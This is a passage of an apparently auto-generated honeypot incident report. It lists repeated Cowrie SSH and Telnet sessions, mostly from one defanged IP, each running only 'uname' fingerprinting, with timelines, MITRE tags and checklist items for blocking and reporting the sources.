- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a99a5d879a74

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:44 |
| **Last Seen** | 2026-07-19 09:44 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:44:36` | `cowrie.session.connect` |
| `2026-07-19 09:44:36` | `cowrie.client.version` |
| `2026-07-19 09:44:36` | `cowrie.client.kex` |
| `2026-07-19 09:44:39` | `cowrie.login.success` |
| `2026-07-19 09:44:41` | `cowrie.session.params` |
| `2026-07-19 09:44:41` | `cowrie.command.input` |
| `2026-07-19 09:44:42` | `cowrie.log.closed` |
| `2026-07-19 09:44:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2dcfb1db55d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:44 |
| **Last Seen** | 2026-07-19 09:44 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:44:42` | `cowrie.session.connect` |
| `2026-07-19 09:44:44` | `cowrie.client.version` |
| `2026-07-19 09:44:44` | `cowrie.client.kex` |
| `2026-07-19 09:44:55` | `cowrie.login.success` |
| `2026-07-19 09:44:58` | `cowrie.session.params` |
| `2026-07-19 09:44:58` | `cowrie.command.input` |
| `2026-07-19 09:44:59` | `cowrie.log.closed` |
| `2026-07-19 09:44:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-70aeb292ff2c

| Field | Detail |
|---|---|
| **Source IP** | `185.65.202[.]199` |
| **First Seen** | 2026-07-19 09:44 |
| **Last Seen** | 2026-07-19 09:45 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:44:47` | `cowrie.session.connect` |
| `2026-07-19 09:44:47` | `cowrie.telnet.option` |
| `2026-07-19 09:44:47` | `cowrie.telnet.option` |
| `2026-07-19 09:45:47` | `cowrie.login.success` |
| `2026-07-19 09:45:47` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `185.65.202[.]199` to AbuseIPDB if not already reported
- [ ] Block `185.65.202[.]199` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-716b2b566ac3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:44 |
| **Last Seen** | 2026-07-19 09:45 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:44:48` | `cowrie.session.connect` |
| `2026-07-19 09:44:52` | `cowrie.client.version` |
| `2026-07-19 09:44:52` | `cowrie.client.kex` |
| `2026-07-19 09:44:58` | `cowrie.login.success` |
| `2026-07-19 09:45:03` | `cowrie.session.params` |
| `2026-07-19 09:45:03` | `cowrie.command.input` |
| `2026-07-19 09:45:04` | `cowrie.log.closed` |
| `2026-07-19 09:45:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d346259592a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:45 |
| **Last Seen** | 2026-07-19 09:45 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:45:02` | `cowrie.session.connect` |
| `2026-07-19 09:45:03` | `cowrie.client.version` |
| `2026-07-19 09:45:03` | `cowrie.client.kex` |
| `2026-07-19 09:45:09` | `cowrie.login.success` |
| `2026-07-19 09:45:14` | `cowrie.session.params` |
| `2026-07-19 09:45:14` | `cowrie.command.input` |
| `2026-07-19 09:45:17` | `cowrie.log.closed` |
| `2026-07-19 09:45:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7569c2c6814

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:45 |
| **Last Seen** | 2026-07-19 09:45 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:45:09` | `cowrie.session.connect` |
| `2026-07-19 09:45:11` | `cowrie.client.version` |
| `2026-07-19 09:45:11` | `cowrie.client.kex` |
| `2026-07-19 09:45:22` | `cowrie.login.success` |
| `2026-07-19 09:45:26` | `cowrie.session.params` |
| `2026-07-19 09:45:26` | `cowrie.command.input` |
| `2026-07-19 09:45:27` | `cowrie.log.closed` |
| `2026-07-19 09:45:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bd31a2ddd44

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:45 |
| **Last Seen** | 2026-07-19 09:45 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:45:16` | `cowrie.session.connect` |
| `2026-07-19 09:45:18` | `cowrie.client.version` |
| `2026-07-19 09:45:18` | `cowrie.client.kex` |
| `2026-07-19 09:45:26` | `cowrie.login.success` |
| `2026-07-19 09:45:30` | `cowrie.session.params` |
| `2026-07-19 09:45:30` | `cowrie.command.input` |
| `2026-07-19 09:45:34` | `cowrie.log.closed` |
| `2026-07-19 09:45:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-951dba1b553f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:45 |
| **Last Seen** | 2026-07-19 09:46 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:45:26` | `cowrie.session.connect` |
| `2026-07-19 09:45:28` | `cowrie.client.version` |
| `2026-07-19 09:45:28` | `cowrie.client.kex` |
| `2026-07-19 09:45:55` | `cowrie.login.success` |
| `2026-07-19 09:46:06` | `cowrie.session.params` |
| `2026-07-19 09:46:06` | `cowrie.command.input` |
| `2026-07-19 09:46:11` | `cowrie.log.closed` |
| `2026-07-19 09:46:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f933c976a069

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:45 |
| **Last Seen** | 2026-07-19 09:46 |
| **Session Duration** | 58s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:45:31` | `cowrie.session.connect` |
| `2026-07-19 09:45:35` | `cowrie.client.version` |
| `2026-07-19 09:45:35` | `cowrie.client.kex` |
| `2026-07-19 09:46:15` | `cowrie.login.success` |
| `2026-07-19 09:46:26` | `cowrie.session.params` |
| `2026-07-19 09:46:26` | `cowrie.command.input` |
| `2026-07-19 09:46:30` | `cowrie.log.closed` |
| `2026-07-19 09:46:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c2c5196f9b5c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:45 |
| **Last Seen** | 2026-07-19 09:46 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:45:37` | `cowrie.session.connect` |
| `2026-07-19 09:45:50` | `cowrie.client.version` |
| `2026-07-19 09:45:50` | `cowrie.client.kex` |
| `2026-07-19 09:46:08` | `cowrie.login.success` |
| `2026-07-19 09:46:18` | `cowrie.session.params` |
| `2026-07-19 09:46:18` | `cowrie.command.input` |
| `2026-07-19 09:46:25` | `cowrie.log.closed` |
| `2026-07-19 09:46:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f2bc3bca78f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:45 |
| **Last Seen** | 2026-07-19 09:46 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:45:44` | `cowrie.session.connect` |
| `2026-07-19 09:45:46` | `cowrie.client.version` |
| `2026-07-19 09:45:46` | `cowrie.client.kex` |
| `2026-07-19 09:46:03` | `cowrie.login.success` |
| `2026-07-19 09:46:12` | `cowrie.session.params` |
| `2026-07-19 09:46:12` | `cowrie.command.input` |
| `2026-07-19 09:46:16` | `cowrie.log.closed` |
| `2026-07-19 09:46:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe17317015a2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:45 |
| **Last Seen** | 2026-07-19 09:46 |
| **Session Duration** | 38s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:45:55` | `cowrie.session.connect` |
| `2026-07-19 09:46:02` | `cowrie.client.version` |
| `2026-07-19 09:46:02` | `cowrie.client.kex` |
| `2026-07-19 09:46:19` | `cowrie.login.success` |
| `2026-07-19 09:46:30` | `cowrie.session.params` |
| `2026-07-19 09:46:30` | `cowrie.command.input` |
| `2026-07-19 09:46:34` | `cowrie.log.closed` |
| `2026-07-19 09:46:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b373193dc15f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:46 |
| **Last Seen** | 2026-07-19 09:46 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:46:09` | `cowrie.session.connect` |
| `2026-07-19 09:46:13` | `cowrie.client.version` |
| `2026-07-19 09:46:13` | `cowrie.client.kex` |
| `2026-07-19 09:46:28` | `cowrie.login.success` |
| `2026-07-19 09:46:36` | `cowrie.session.params` |
| `2026-07-19 09:46:36` | `cowrie.command.input` |
| `2026-07-19 09:46:39` | `cowrie.log.closed` |
| `2026-07-19 09:46:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3713dee8a03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:46 |
| **Last Seen** | 2026-07-19 09:46 |
| **Session Duration** | 31s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:46:19` | `cowrie.session.connect` |
| `2026-07-19 09:46:26` | `cowrie.client.version` |
| `2026-07-19 09:46:26` | `cowrie.client.kex` |
| `2026-07-19 09:46:40` | `cowrie.login.success` |
| `2026-07-19 09:46:48` | `cowrie.session.params` |
| `2026-07-19 09:46:48` | `cowrie.command.input` |
| `2026-07-19 09:46:50` | `cowrie.log.closed` |
| `2026-07-19 09:46:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ccd69219fd1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:46 |
| **Last Seen** | 2026-07-19 09:47 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:46:32` | `cowrie.session.connect` |
| `2026-07-19 09:46:36` | `cowrie.client.version` |
| `2026-07-19 09:46:36` | `cowrie.client.kex` |
| `2026-07-19 09:46:49` | `cowrie.login.success` |
| `2026-07-19 09:46:56` | `cowrie.session.params` |
| `2026-07-19 09:46:56` | `cowrie.command.input` |
| `2026-07-19 09:47:01` | `cowrie.log.closed` |
| `2026-07-19 09:47:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3424ea71b4a5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:46 |
| **Last Seen** | 2026-07-19 09:47 |
| **Session Duration** | 24s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:46:48` | `cowrie.session.connect` |
| `2026-07-19 09:46:50` | `cowrie.client.version` |
| `2026-07-19 09:46:50` | `cowrie.client.kex` |
| `2026-07-19 09:47:05` | `cowrie.login.success` |
| `2026-07-19 09:47:09` | `cowrie.session.params` |
| `2026-07-19 09:47:09` | `cowrie.command.input` |
| `2026-07-19 09:47:13` | `cowrie.log.closed` |
| `2026-07-19 09:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5cbe98d0148

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:46 |
| **Last Seen** | 2026-07-19 09:47 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:46:54` | `cowrie.session.connect` |
| `2026-07-19 09:47:00` | `cowrie.client.version` |
| `2026-07-19 09:47:00` | `cowrie.client.kex` |
| `2026-07-19 09:47:09` | `cowrie.login.success` |
| `2026-07-19 09:47:16` | `cowrie.session.params` |
| `2026-07-19 09:47:16` | `cowrie.command.input` |
| `2026-07-19 09:47:17` | `cowrie.log.closed` |
| `2026-07-19 09:47:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e246abb40cf4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:47 |
| **Last Seen** | 2026-07-19 09:47 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:47:14` | `cowrie.session.connect` |
| `2026-07-19 09:47:16` | `cowrie.client.version` |
| `2026-07-19 09:47:16` | `cowrie.client.kex` |
| `2026-07-19 09:47:21` | `cowrie.login.success` |
| `2026-07-19 09:47:27` | `cowrie.session.params` |
| `2026-07-19 09:47:27` | `cowrie.command.input` |
| `2026-07-19 09:47:28` | `cowrie.log.closed` |
| `2026-07-19 09:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-56fc529177b6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:47 |
| **Last Seen** | 2026-07-19 09:47 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:47:26` | `cowrie.session.connect` |
| `2026-07-19 09:47:27` | `cowrie.client.version` |
| `2026-07-19 09:47:27` | `cowrie.client.kex` |
| `2026-07-19 09:47:33` | `cowrie.login.success` |
| `2026-07-19 09:47:36` | `cowrie.session.params` |
| `2026-07-19 09:47:36` | `cowrie.command.input` |
| `2026-07-19 09:47:37` | `cowrie.log.closed` |
| `2026-07-19 09:47:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4bee6afeffd

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:47 |
| **Last Seen** | 2026-07-19 09:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:47:38` | `cowrie.session.connect` |
| `2026-07-19 09:47:39` | `cowrie.client.version` |
| `2026-07-19 09:47:39` | `cowrie.client.kex` |
| `2026-07-19 09:47:43` | `cowrie.login.success` |
| `2026-07-19 09:47:45` | `cowrie.session.params` |
| `2026-07-19 09:47:45` | `cowrie.command.input` |
| `2026-07-19 09:47:46` | `cowrie.log.closed` |
| `2026-07-19 09:47:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-544ce9db619b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:47 |
| **Last Seen** | 2026-07-19 09:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:47:50` | `cowrie.session.connect` |
| `2026-07-19 09:47:50` | `cowrie.client.version` |
| `2026-07-19 09:47:50` | `cowrie.client.kex` |
| `2026-07-19 09:47:54` | `cowrie.login.success` |
| `2026-07-19 09:47:56` | `cowrie.session.params` |
| `2026-07-19 09:47:56` | `cowrie.command.input` |
| `2026-07-19 09:47:58` | `cowrie.log.closed` |
| `2026-07-19 09:47:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7da714c03761

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:48 |
| **Last Seen** | 2026-07-19 09:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:48:04` | `cowrie.session.connect` |
| `2026-07-19 09:48:04` | `cowrie.client.version` |
| `2026-07-19 09:48:04` | `cowrie.client.kex` |
| `2026-07-19 09:48:08` | `cowrie.login.success` |
| `2026-07-19 09:48:10` | `cowrie.session.params` |
| `2026-07-19 09:48:10` | `cowrie.command.input` |
| `2026-07-19 09:48:10` | `cowrie.log.closed` |
| `2026-07-19 09:48:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f261868b3bbb

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:48 |
| **Last Seen** | 2026-07-19 09:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:48:18` | `cowrie.session.connect` |
| `2026-07-19 09:48:18` | `cowrie.client.version` |
| `2026-07-19 09:48:18` | `cowrie.client.kex` |
| `2026-07-19 09:48:21` | `cowrie.login.success` |
| `2026-07-19 09:48:24` | `cowrie.session.params` |
| `2026-07-19 09:48:24` | `cowrie.command.input` |
| `2026-07-19 09:48:24` | `cowrie.log.closed` |
| `2026-07-19 09:48:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7754d13a23b3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:48 |
| **Last Seen** | 2026-07-19 09:48 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:48:29` | `cowrie.session.connect` |
| `2026-07-19 09:48:30` | `cowrie.client.version` |
| `2026-07-19 09:48:30` | `cowrie.client.kex` |
| `2026-07-19 09:48:39` | `cowrie.login.success` |
| `2026-07-19 09:48:43` | `cowrie.session.params` |
| `2026-07-19 09:48:43` | `cowrie.command.input` |
| `2026-07-19 09:48:45` | `cowrie.log.closed` |
| `2026-07-19 09:48:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-483fb3d7aa44

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:48 |
| **Last Seen** | 2026-07-19 09:48 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:48:41` | `cowrie.session.connect` |
| `2026-07-19 09:48:43` | `cowrie.client.version` |
| `2026-07-19 09:48:43` | `cowrie.client.kex` |
| `2026-07-19 09:48:51` | `cowrie.login.success` |
| `2026-07-19 09:48:55` | `cowrie.session.params` |
| `2026-07-19 09:48:55` | `cowrie.command.input` |
| `2026-07-19 09:48:58` | `cowrie.log.closed` |
| `2026-07-19 09:48:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]19` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]19` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fbb6f0e7c5d2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]19` |
| **First Seen** | 2026-07-19 09:48 |
| **Last Seen** | 2026-07-19 09:49 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-19 09:48:54` | `cowrie.session.connect` |
| `2026-07-19 09:48:57` | `cowrie.client.version` |
| `2026-07-19 09:48:57` | `cowrie.client.kex` |
| `2026-07-19 09:49:03` | `cowrie.login.success` |
| `2026-07-19 09:49:08` | `cowrie.session.params` |
| `2026-07-19 09:49:08` | `cowrie.command.input` |
